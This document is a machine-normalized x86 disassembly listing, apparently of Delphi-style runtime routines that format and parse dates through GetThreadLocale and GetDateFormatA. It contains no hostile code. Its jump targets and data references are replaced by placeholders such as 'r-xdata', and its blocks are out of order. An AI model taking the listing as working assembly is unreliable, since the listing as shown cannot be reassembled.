lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407a88
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407a88
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407a88
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_4094c0
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_409710
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_4095c4
pop esi
pop ecx
pop ebp
retn 0x8
sub_409730
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_4093b0
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_40976c
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028b8
sub_4097b0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_40427c
mov edx eax
mov eax ebx
call sub_40976c
pop ecx
pop ebx
pop ebp
retn
sub_4097d0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_40879c
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_40976c
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40981c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_409848
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_409710
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_409880
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_409464
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_4098c0
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409a0e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403fbc
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404054
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40447c
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409a15
lea eax [ ebp - 0x118 ]
call sub_403fbc
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_40422c
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_40427c
mov edx eax
mov eax [ ebx ]
call sub_40be04
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40bf78
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_4044dc
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40bf14
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_4041b4
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40bf78
mov ecx eax
mov eax ebx
mov edx esi
call sub_4040ac
sub_409a28
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409b06
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403fbc
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404054
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404054
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409b0d
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_40422c
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40447c
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_40427c
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_4044dc
sub_409b30
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a2b1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a2b8
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403fe0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40bff8
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40bfd8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_40976c
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40bff8
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_40976c
pop ecx
mov al [ eax + lookup_table_409c13 ]
jmp [ eax * 4 + jump_table_409c4c ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_40981c
pop ecx
push ebp
call sub_409848
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_40981c
pop ecx
push ebp
call sub_409848
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_4098c0
pop ecx
mov eax [ ebp - 0x24 ]
call sub_4097b0
pop ecx
jmp r-xdata
push ebp
call sub_40981c
pop ecx
push ebp
call sub_409848
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_409a28
pop ecx
mov eax [ ebp - 0x28 ]
call sub_4097b0
pop ecx
jmp r-xdata
push ebp
call sub_40981c
pop ecx
push ebp
call sub_409848
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_40981c
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_40981c
pop ecx
push ebp
call sub_409880
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_40981c
pop ecx
push ebp
call sub_409880
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_40981c
pop ecx
push ebp
call sub_409880
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_40981c
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_40981c
pop ecx
push ebp
call sub_409880
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_409880
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_40860c
test eax eax
jne r-xdata
push ebp
call sub_40981c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409b30
pop ecx
push ebp
call sub_409880
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_4097d0
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_4097d0
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_4097d0
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_409848
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_4097d0
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_4097d0
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_4097d0
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409b30
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409b30
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4097d0
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_40860c
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_40976c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409b30
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_40976c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_40976c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_4097b0
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409730
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_4097b0
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_40860c
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_40976c
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_40976c
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_4097b0
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409730
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_4097b0
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40bff8
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_40860c
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_40976c
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409b30
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_4097d0
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_40860c
test eax eax
jne r-xdata
push ebp
call sub_409848
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409730
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_4097b0
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4097b0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4097b0
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40bff8
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409b30
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_40976c
pop ecx
jmp r-xdata
push ebp
call sub_409848
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409730
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_4097b0
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_40860c
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_40860c
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_40860c
test eax eax
jne r-xdata
jmp r-xdata
sub_40a2e4
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_409b30
pop ecx
push ebp
mov eax ebx
call sub_409b30
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_4040ac
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a354
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_40427c
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a378
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a354
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_40427c
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a40c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a485
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a48c
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a354
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_40427c
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_4044dc
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_407d2c
test eax eax
jne r-xdata
mov eax edi
call sub_40427c
add [ esi ] eax
mov bl 0x1
sub_40a498
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a354
mov eax esi
call sub_40427c
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40a4d0
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_40427c
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40a51c
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_40427c
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c03c
mov [ ebx ] eax
jmp r-xdata
sub_40a564
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40447c
push eax
mov eax [ ebx ]
call sub_40447c
pop edx
call sub_40c13c
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40a5b8
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_409758
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40a614
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a92f
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40a4d0
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c078
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a378
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40a51c
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_4044dc
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_407d9c
mov eax [ ebp - 0x1c ]
call sub_40a564
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a936
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_403fe0
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a498
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a378
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a498
test al al
je r-xdata
call sub_409758
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a378
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_4094fc
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_4045c0
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a498
mov edx ebx
mov eax esi
call sub_40a354
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
